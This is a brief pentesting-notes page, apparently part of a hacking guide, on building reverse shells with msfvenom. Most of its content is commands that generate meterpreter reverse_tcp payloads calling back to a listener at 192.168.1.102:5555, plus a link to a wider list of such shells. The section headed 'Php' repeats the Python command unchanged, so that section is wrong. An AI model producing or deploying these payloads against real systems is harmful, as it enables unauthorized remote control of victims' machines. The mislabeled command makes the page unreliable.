# Creating reverse-shells


In the chapter Basics I linked to some reverse shells. Another way to create reverse shells is by using msfvenom.

Here is a good list for creating shells with msfvenom. 
http://netsec.ws/?p=331

## Python

```
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5555 > python_meterpter_reverse_tcp.py
```

## Php

```
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5555 > python_meterpter_reverse_tcp.py
```

